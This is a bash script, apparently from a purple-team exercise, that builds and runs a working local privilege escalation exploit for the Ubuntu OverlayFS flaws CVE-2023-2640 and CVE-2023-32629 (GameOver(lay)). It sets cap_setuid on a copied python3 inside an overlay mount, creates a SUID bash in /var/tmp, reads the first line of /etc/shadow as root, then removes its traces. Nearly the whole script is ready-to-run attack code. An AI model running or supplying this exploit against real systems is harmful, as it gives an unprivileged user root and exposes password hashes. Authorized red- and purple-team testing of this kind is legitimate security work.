#!/bin/bash
# Purple Team A1 - Stage 1: direct LPE, no external staging (T1068 only)
# Exploit: CVE-2023-2640/32629 (GameOver(lay)) - OverlayFS + python3 cap_setuid
LOG=/tmp/purple_team_a1_runlog.txt
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_before=$(id)" >> $LOG

# Build a self-contained exploit that runs non-interactively.
# The g1vi PoC uses python3 os.system() to:
#   cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf ...
# We replace the os.system() payload so it:
#   1. Copies bash as SUID (same technique)
#   2. Runs commands through bash -p (non-interactive, captures output)
#   3. Cleans up
cat > /tmp/.a1_s1.sh << 'EXPLOIT_SCRIPT'
#!/bin/bash
# CVE-2023-2640 CVE-2023-32629: GameOver(lay) Ubuntu Privilege Escalation (non-interactive variant)
echo "[+] You should be root now"
echo "[+] Running commands in root context..."
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c '
import os
os.setuid(0)
os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash")
result = os.popen("/var/tmp/bash -p -c \"id && cat /etc/shadow | head -1 && echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED\"").read()
print(result)
os.system("rm -rf l m u w /var/tmp/bash")
'
EXPLOIT_SCRIPT

chmod +x /tmp/.a1_s1.sh
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) running exploit" >> $LOG
bash /tmp/.a1_s1.sh 2>&1 | tee -a $LOG
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_after=$(id)" >> $LOG
